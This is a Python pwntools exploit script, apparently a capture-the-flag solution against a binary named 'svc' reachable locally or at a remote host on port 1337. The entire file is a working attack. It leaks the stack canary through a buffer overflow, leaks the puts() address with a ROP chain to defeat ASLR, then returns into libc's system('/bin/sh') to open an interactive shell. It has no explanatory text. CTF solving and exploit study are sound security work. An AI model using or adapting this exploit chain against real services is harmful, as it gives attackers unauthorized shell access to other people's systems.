#!/usr/bin/env python3

from pwn import *

exe = ELF("./svc")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()
    
    #gdb.attach(r)
    
    # leaking the stack canary
    r.sendline("1")
    r.send("A" * 169)

    r.sendline("2")
    r.recvuntil("A" * 169)
    canary = "\x00" + r.recvn(7)
    log.info("canary: {}".format(canary.encode("hex")))

    # leaking puts() address
    pop_rdi = 0x0000000000400ea3
    function_addr = 0x00400a96

    r.sendline("1")
    r.send("A" * 168 + canary + "B" * 8 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.symbols['puts']) + p64(function_addr))
    r.sendline("3")

    r.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")
    leak = u64(r.recvn(6) + "\x00\x00")

    log.info("leak: {}".format(hex(leak)))

    # calculating system() and "/bin/sh" and overwriting
    libc.address = leak - libc.symbols['puts']
    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh\x00'))

    r.sendline("1")
    r.send("A" * 168 + canary + "B" * 8 + p64(pop_rdi) + p64(binsh) + p64(system))
    r.sendline("3")
    
    r.interactive()


if __name__ == "__main__":
    main()